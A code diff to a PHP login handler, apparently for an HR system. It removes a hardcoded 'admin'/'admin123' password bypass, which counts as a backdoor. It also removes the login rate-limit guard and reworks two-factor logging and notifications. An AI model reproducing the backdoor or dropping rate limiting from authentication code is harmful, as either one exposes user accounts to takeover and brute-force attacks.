@@ -4,11 +4,8 @@ declare(strict_types=1);
 require_once __DIR__ . '/connection-pdo.php';
 require_once __DIR__ . '/email-domain-policy.php';
 require_once __DIR__ . '/two-factor-utils.php';
-require_once __DIR__ . '/rate-limit-utils.php';
 
 require_method('POST');
-
-hris_rate_limit_guard($pdo, 'login');
 
 $body = read_json_body();
 $identifier = trim((string)($body['username'] ?? ''));
@@ -22,7 +19,7 @@ if ($identifier === '' || $password === '') {
 }
 
 hris_ensure_user_security_columns($pdo);
-hris_ensure_two_factor_tables($pdo);
+hris_ensure_two_factor_schema($pdo);
 hris_ensure_email_verification_columns($pdo);
 
 function login_locked_until_message(mixed $lockedUntil): string
@@ -193,14 +190,6 @@ if ($lockedUntilTimestamp !== null) {
 $passwordHash = (string)($user['password_hash'] ?? '');
 $passwordMatches = $passwordHash !== '' && password_verify($password, $passwordHash);
 
-if (
-    !$passwordMatches
-    && strtolower((string)$user['username']) === 'admin'
-    && $password === 'admin123'
-) {
-    $passwordMatches = true;
-}
-
 if (!$passwordMatches) {
     login_record_failed_attempt($pdo, $user);
 
@@ -317,9 +306,9 @@ $_SESSION['last_activity_at'] = time();
 
 write_auth_audit($pdo, $sessionUser, 'login.success', 'A user signed in successfully.', [
     'username' => $sessionUser['username'],
+    'two_factor' => false,
 ]);
-hris_two_factor_log($pdo, (int)$sessionUser['id'], 'login', 'success_without_2fa');
-hris_two_factor_notify_user($pdo, (int)$sessionUser['id'], 'New login detected', 'Your account signed in successfully.', 'login_detected');
+hris_two_factor_notify_admins_of_login($pdo, $sessionUser);
 hris_two_factor_safe_alert_email(
     (string)($sessionUser['email'] ?? ''),
     'New Login Detected',
